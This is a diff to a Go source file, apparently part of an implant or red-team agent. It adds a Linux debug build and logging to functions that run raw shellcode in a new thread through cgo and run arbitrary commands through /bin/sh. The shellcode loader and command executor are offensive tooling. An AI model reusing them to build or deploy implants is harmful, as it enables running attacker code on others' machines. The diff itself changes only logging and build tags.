@@ -1,4 +1,4 @@
-//go:build linux && !debug
+//go:build linux && debug
 
 package modules
 
@@ -25,20 +25,26 @@ void call(char *shellcode, size_t length) {
 */
 import "C"
 import (
+	"log"
 	"os/exec"
 	"unsafe"
 )
 
 func ShellcodeExec(sc []byte) {
+	log.Printf("[START LINUX SHELLCODE EXEC] starting new thread with following shellcode: % X\n", sc)
 	go C.call((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
+	log.Printf("[END LINUX SHELLCODE EXEC] Called C-code. Cannot trace new thread.")
 }
 
 // Executes a command in shell and returns stdout
 func Exec(cmd string) ([]byte, error) {
+	log.Printf("[START LINUX EXEC] command: %s\n", cmd)
 	command := exec.Command("/bin/sh", "-c", cmd)
 	byteOut, err := command.CombinedOutput()
 	if err != nil {
+		log.Printf("[ERROR LINUX EXEC] error: %s\n", err.Error())
 		return nil, err
 	}
+	log.Printf("[SUCCESS LINUX EXEC] result: %s\n", string(byteOut))
 	return byteOut, nil
 }
